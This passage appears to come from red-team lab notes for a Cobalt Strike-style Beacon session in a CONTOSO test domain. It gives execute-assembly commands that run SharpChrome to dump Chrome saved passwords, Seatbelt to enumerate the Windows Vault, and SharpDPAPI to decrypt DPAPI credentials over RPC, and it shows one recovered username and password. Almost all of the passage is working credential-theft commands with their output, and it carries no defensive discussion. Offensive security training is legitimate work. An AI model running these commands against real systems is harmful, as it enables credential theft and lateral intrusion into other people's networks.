- From the medium-integrity Beacon, read the credentials from Chrome's database.
``
```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

`CONTOSO\pchilds,Passw0rd!`

- From the medium-integrity Beacon, enumerate the vault.

```powershell
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
```

-  Decrypt the credentials using RPC to fetch the DPAPI key.

```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```